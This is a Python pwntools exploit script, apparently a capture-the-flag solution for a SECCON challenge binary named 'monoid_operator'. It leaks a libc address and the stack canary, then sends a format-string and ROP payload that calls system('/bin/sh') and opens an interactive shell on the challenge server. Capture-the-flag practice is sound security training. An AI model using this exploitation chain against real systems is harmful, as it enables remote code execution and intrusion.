from pwn import *
#io=process("./monoid_operator_9092cbe0e255da46164bf38851880c1878ad3cbd")
io=remote("monoidoperator.chal.seccon.jp",27182)
def func(size,num):
    io.sendlineafter("What operator do you choose?","+")
    io.recvline()
    io.sendlineafter("How many integers do you input?",str(size))
    io.recvline()
    io.sendlineafter("Input integers.",num)
    for i in range(size-2):
        io.sendline(num)
    io.sendline("-1")

func(130,"1")
io.recvuntil("What operator do you choose?")
io.sendlineafter("What operator do you choose?","+")
io.recvline()
io.sendlineafter("How many integers do you input?","130")
io.recvline()
io.sendlineafter("Input integers.","-")
for i in range(129):
    io.sendline("0")
io.recvuntil("The answer is ")
leak=io.recvuntil(".")[:-1]
canary= int(leak,10)+0x78c8
print hex(int(leak,10))
leak=int(leak,10)
base=leak-0x1e4ca0
sys=base+0x52fd0
sh=base+0x1afb84
pop_rdi=base+0x26542
#gdb.attach(io)
io.recvuntil("What operator do you choose?")
io.recvuntil("What operator do you choose?")
io.sendline("q")
io.sendlineafter("What is your name?","sss")
io.recvuntil("Please write your feed back!")
print hex(sys)
io.send(("%01032x"+"%291$c"+"%144$s"+p64(pop_rdi+1)[:-2]+"%291$c"*2+p64(pop_rdi)[:-2]+"%291$c"*2+p64(sh)[:-2]+"%291$c"*2+p64(sys)).ljust(1024," ")[:-8]+p64(canary+1))
io.interactive()
